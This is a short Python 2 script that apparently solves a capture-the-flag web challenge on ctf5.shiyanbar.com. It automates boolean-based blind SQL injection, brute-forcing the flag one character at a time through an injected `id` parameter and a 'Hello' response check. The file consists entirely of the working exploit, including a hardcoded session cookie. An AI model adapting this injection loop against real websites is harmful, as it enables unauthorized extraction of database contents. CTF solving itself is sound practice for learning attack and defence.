#coding:utf-8
#author : ch3rry

import httplib
import sys
import urllib
import time

payloads = list('}@_!-[],{1234567890qQWweERrTtYYuUIioOpPAasSDdfFGghHJjkKLlzZXxcCVvbBNnMm')

urls = ''
flag = ''

headers={
		'Host': 'ctf5.shiyanbar.com',
		'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Cookie': 'PHPSESSID=g7cbl254tl31bq5vs818rpjno2; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1500948349; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1500965576; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*101700%2CnickName%3Ach3rry%E4%B8%B6',
		'Connection': 'keep-alive',
		'Referer': 'http://ctf5.shiyanbar.com/',
		'Upgrade-Insecure-Requests': '1'
}

for i in range(1,35):
	for payload in payloads:
		urls = "/web/index_3.php?id=999'+or+(select+ascii(substr((select+flag+from+flag),%s,1))=%s)+and+'1'='1" %(i,ord(payload))
		conn = httplib.HTTPConnection('ctf5.shiyanbar.com',timeout=10)
		conn.request(method='GET',url=urls,headers=headers)
		r = conn.getresponse().read()
		print '*',
		if 'Hello' in r:
			flag += payload
			sys.stdout.write('\n[+]'+flag)
			break
print "\n[Done] The flag is : %s" %flag